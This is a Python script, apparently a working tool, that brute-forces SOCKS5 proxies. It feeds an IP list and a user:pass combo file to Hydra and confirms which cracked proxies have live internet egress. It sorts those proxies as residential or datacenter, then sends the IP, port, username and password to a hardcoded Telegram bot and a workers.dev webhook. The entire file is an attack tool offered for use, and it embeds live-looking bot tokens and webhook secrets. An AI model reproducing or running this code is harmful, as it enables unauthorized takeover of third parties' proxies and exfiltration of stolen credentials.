import asyncio
import aiohttp
import time
import os
import re
import sys
import random
from aiohttp_socks import ProxyConnector
from datetime import datetime

# ================= 配置区 =================
TG_BOT_TOKEN = "8517647551:AAEosyUg4hcmy1hy4mdiKoo-M9sg9ZqRSAY"
TG_CHAT_ID = "6977085303"
WEBHOOK_URL = "https://wepush.yhe8714.workers.dev/wxsend"
WEBHOOK_AUTH = "hy248624"

# 字典文件名 (格式: user:pass)
COMBO_FILE = "combo.txt"

# 测速 URL
CHECK_URL = "http://www.google.com/generate_204" 
# ==========================================

TOTAL_IPS = 0
FINISHED_IPS = 0
SUCCESS_COUNT = 0
START_TIME = time.time()

def load_resources():
    """仅加载 IP 列表，字典交由 Hydra 直接读取"""
    ips = []
    try:
        with open('socks5_list.txt', 'r', encoding='utf-8') as f:
            for line in f:
                parts = [p.strip() for p in line.split('|')]
                if len(parts) >= 2:
                    ip_match = re.search(r'(\d{1,3}(?:\.\d{1,3}){3})', parts[0])
                    port_match = re.search(r'(\d+)', parts[1])
                    if ip_match and port_match:
                        ips.append({
                            "ip": ip_match.group(1),
                            "port": port_match.group(1),
                            "country": parts[2] if len(parts) > 2 else "未知",
                            "city": parts[3] if len(parts) > 3 else "未知",
                            "asn": parts[4] if len(parts) > 4 else "未知"
                        })
        return ips
    except FileNotFoundError:
        print("❌ 找不到文件: socks5_list.txt")
        sys.exit(1)

async def send_notify(content, title="🎯 发现可用 SOCKS5 节点"):
    """发送 TG 与 Webhook 通知 (适配标准 JSON 模板)"""
    timestamp_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    async with aiohttp.ClientSession() as session:
        # Telegram 发送
        tg_api = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
        tg_task = session.post(
            tg_api, 
            json={"chat_id": TG_CHAT_ID, "text": content}, 
            timeout=10
        )
        
        # Webhook 发送
        web_headers = {
            "Authorization": WEBHOOK_AUTH, 
            "Content-Type": "application/json"
        }
        web_payload = {
            "title": title,
            "content": content,
            "timestamp": timestamp_str
        }
        wh_task = session.post(
            WEBHOOK_URL, 
            json=web_payload, 
            headers=web_headers, 
            timeout=10
        )
        
        await asyncio.gather(tg_task, wh_task, return_exceptions=True)

async def verify_and_speedtest(ip, port, user, pwd):
    """测试实际连通性"""
    proxy_url = f"socks5://{user}:{pwd}@{ip}:{port}"
    connector = ProxyConnector.from_url(proxy_url)
    
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            start_t = time.time()
            async with session.get(CHECK_URL, timeout=10) as resp:
                if resp.status in [200, 204]:
                    return True, (time.time() - start_t) * 1000, proxy_url
    except:
        pass
    return False, 0, proxy_url

async def get_ip_type(ip):
    """调用免鉴权 API 检测 IP 的宽带类型"""
    # 请求 hosting(机房), mobile(蜂窝数据), proxy(代理黑名单), isp(真实运营商) 等字段
    url = f"http://ip-api.com/json/{ip}?fields=status,mobile,proxy,hosting,isp"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=8) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("status") == "success":
                        isp = data.get("isp", "未知ISP")
                        
                        # 按权重判定类型
                        if data.get("hosting"):
                            ip_type = "🖥️ 机房/数据中心 (Datacenter)"
                        elif data.get("mobile"):
                            ip_type = "📱 移动蜂窝网络 (Cellular)"
                        elif data.get("proxy"):
                            ip_type = "🛡️ 代理/VPN节点 (Proxy)"
                        else:
                            ip_type = "🏠 家庭/企业宽带 (Residential)"
                            
                        return ip_type, isp
    except Exception:
        pass
    return "❓ 未知类型", "未知ISP"

async def run_hydra(ip_info):
    """调用本地 Hydra 进行账密组合爆破"""
    ip = ip_info['ip']
    port = ip_info['port']
    
    sys.stdout.write(f"\r[Hydra 爆破中] {ip}:{port} | 正在尝试字典...   ")
    sys.stdout.flush()

    cmd = [
        "hydra", "-C", COMBO_FILE, "-s", port, 
        "-t", "20", "-f", "-I", ip, "socks5"
    ]
    
    process = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )

    try:
        stdout, _ = await asyncio.wait_for(process.communicate(), timeout=300)  # 5分钟超时
    except asyncio.TimeoutError:
        process.kill()
        print(f"\n⚠️ IP {ip} Hydra 爆破超时 (5min)，已终止。")
        return None

    output = stdout.decode('utf-8', errors='ignore')
    
    for line in output.splitlines():
        if "login:" in line and "password:" in line:
            match = re.search(r'login:\s*(.*?)\s+password:\s*(.*)', line)
            if match:
                return match.group(1).strip(), match.group(2).strip()
    return None

async def process_ip(ip_info, current_idx, total_ips):
    global FINISHED_IPS, SUCCESS_COUNT
    
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n[{current_time}] ▶️ [进度: {current_idx}/{total_ips}] 开始扫描 IP: {ip_info['ip']} | {ip_info['country']}")
    
    credentials = await run_hydra(ip_info)
    
    if credentials:
        user, pwd = credentials
        sys.stdout.write(f"\r[验证中] Hydra 命中 ({user}:{pwd})，正在测试国际出口...   ")
        sys.stdout.flush()
        
        is_valid, latency, p_url = await verify_and_speedtest(ip_info['ip'], ip_info['port'], user, pwd)
        
        if is_valid:
            # === 新增：获取IP类型与ISP信息 ===
            sys.stdout.write(f"\r[指纹识别] 正在检测 {ip_info['ip']} 的宽带类型...   ")
            sys.stdout.flush()
            ip_type, real_isp = await get_ip_type(ip_info['ip'])
            
            SUCCESS_COUNT += 1
            print(f"\n✅ 节点完全可用! {p_url} [{latency:.1f}ms] | {ip_type}")
            
            report = (
                f"【获取到socks5】\n"
                f"IP：{ip_info['ip']}\n"
                f"端口：{ip_info['port']}\n"
                f"账号：{user}\n"
                f"密码：{pwd}\n\n"
                f"{p_url}\n\n"
                f"TG一键连接 (https://t.me/socks?server={ip_info['ip']}&port={ip_info['port']}&user={user}&pass={pwd})\n"
                f"延迟: {latency:.2f} ms | 测速: 正常\n"
                f"节点类型: {ip_type}\n"
                f"ISP识别: {real_isp}\n"
                f"进度: {current_idx}/{total_ips}\n"
                f"【归属地：{ip_info['country']} {ip_info['city']}】-【录入ASN：{ip_info['asn']}】"
            )
            await send_notify(report)
        else:
            print(f"\n❌ 虚假节点: 鉴权通过，但无实际网络出口权限。")
    else:
        print(f"\n⚪ 爆破完毕: 未找到匹配的账号密码。")
        
    FINISHED_IPS += 1

async def status_reporter():
    """定时汇报"""
    while True:
        await asyncio.sleep(7200)
        run_sec = time.time() - START_TIME
        report = (
            f"已运行: {run_sec//3600:.0f}小时{(run_sec%3600)//60:.0f}分\n"
            f"总进度: {FINISHED_IPS}/{TOTAL_IPS} ({(FINISHED_IPS/TOTAL_IPS*100):.1f}%)\n"
            f"有效节点: {SUCCESS_COUNT} 个"
        )
        await send_notify(report, title="⏰ 爆破进度定时汇报")

async def main():
    global TOTAL_IPS
    
    if not os.path.exists(COMBO_FILE):
        print(f"❌ 错误: 找不到字典文件 {COMBO_FILE}，请确认已创建！")
        return
        
    ips = load_resources()
    TOTAL_IPS = len(ips)
    
    if TOTAL_IPS == 0:
        print("❌ 错误：IP 列表为空。")
        return

    print("="*50)
    print(f"🚀 SOCKS5 爆破扫描器 (V4 带类型侦测)")
    print(f"📅 启动时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"📦 载入 IP: {TOTAL_IPS} 个 | 字典模式: user:pass")
    print("="*50)

    asyncio.create_task(status_reporter())

    for idx, ip_info in enumerate(ips, 1):
        await process_ip(ip_info, idx, TOTAL_IPS)
        
        if idx < TOTAL_IPS:
            cooldown_time = random.randint(3, 5)
            sys.stdout.write(f"\r⏳ 冷却中... 暂停 {cooldown_time} 秒后继续下一个任务   ")
            sys.stdout.flush()
            await asyncio.sleep(cooldown_time)

    final_msg = f"🏁 **所有任务执行完毕**\n共处理 IP: {TOTAL_IPS}\n成功找到: {SUCCESS_COUNT} 个。"
    print(f"\n\n{final_msg}")
    await send_notify(final_msg, title="🏁 爆破任务完成")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n🛑 手动停止脚本。")